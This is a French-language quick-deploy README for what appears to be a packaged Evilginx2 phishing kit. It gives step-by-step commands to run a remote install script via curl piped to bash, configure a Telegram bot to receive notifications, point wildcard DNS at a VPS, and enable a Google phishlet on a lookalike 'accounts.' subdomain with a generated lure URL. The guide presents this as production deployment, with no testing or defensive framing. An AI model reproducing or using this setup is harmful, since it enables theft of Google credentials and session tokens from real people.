# 🚀 DÉPLOIEMENT RAPIDE - RÉSUMÉ

## ⚡ Installation en 5 minutes

### Étape 1 : Connexion au VPS

```bash
ssh root@VOTRE_IP_VPS
```

### Étape 2 : Installation automatique

```bash
curl -sSL https://raw.githubusercontent.com/afriklabprojet/evilginx-pro-collection/main/scripts/quick_deploy.sh | bash
```

### Étape 3 : Configuration Telegram

```bash
nano /opt/evilginx-pro-collection/scripts/telegram_notifier.py
```

Modifier :

- `TELEGRAM_BOT_TOKEN = "VOTRE_TOKEN"`
- `TELEGRAM_CHAT_ID = "VOTRE_CHAT_ID"`

### Étape 4 : Configuration DNS

Sur votre registrar :

```
Type    Nom    Valeur           TTL
A       @      VOTRE_IP_VPS     300
A       *      VOTRE_IP_VPS     300
```

### Étape 5 : Configuration Evilginx

```bash
cd /opt/evilginx2
./evilginx -p /root/.evilginx/phishlets
```

Dans Evilginx :

```
: config domain votre-domaine.com
: config ip VOTRE_IP_VPS
: phishlets hostname google accounts.votre-domaine.com
: phishlets enable google
: lures create google
: lures get-url 0
```

### Étape 6 : Lancer les services

```bash
systemctl start evilginx
systemctl start telegram_notifier
```

## ✅ Vérification

```bash
# Statut des services
systemctl status evilginx telegram_notifier

# Logs
journalctl -u evilginx -f
```

## 📚 Documentation complète

- **Guide détaillé** : [docs/GUIDE-DEPLOIEMENT-VPS.md](docs/GUIDE-DEPLOIEMENT-VPS.md)
- **Dépannage** : [docs/GUIDE-DEPLOIEMENT-VPS.md#dépannage](docs/GUIDE-DEPLOIEMENT-VPS.md#-dépannage)
- **Sécurité** : [docs/GUIDE-DEPLOIEMENT-VPS.md#sécurité](docs/GUIDE-DEPLOIEMENT-VPS.md#-sécurité)

## 🆘 Problèmes courants

### Evilginx ne démarre pas

```bash
journalctl -u evilginx -n 50
lsof -ti:443 | xargs kill -9
systemctl restart evilginx
```

### Pas de notifications Telegram

```bash
journalctl -u telegram_notifier -n 50
systemctl restart telegram_notifier
```

### Certificat SSL invalide

```bash
dig @8.8.8.8 votre-domaine.com
# Attendre la propagation DNS (5-10 min)
```

## ⚠️ Prérequis

- ✅ VPS Ubuntu/Debian
- ✅ Domaine avec accès DNS
- ✅ Bot Telegram créé
- ✅ Accès root SSH

---

**🚀 Déploiement en production en moins de 10 minutes !**
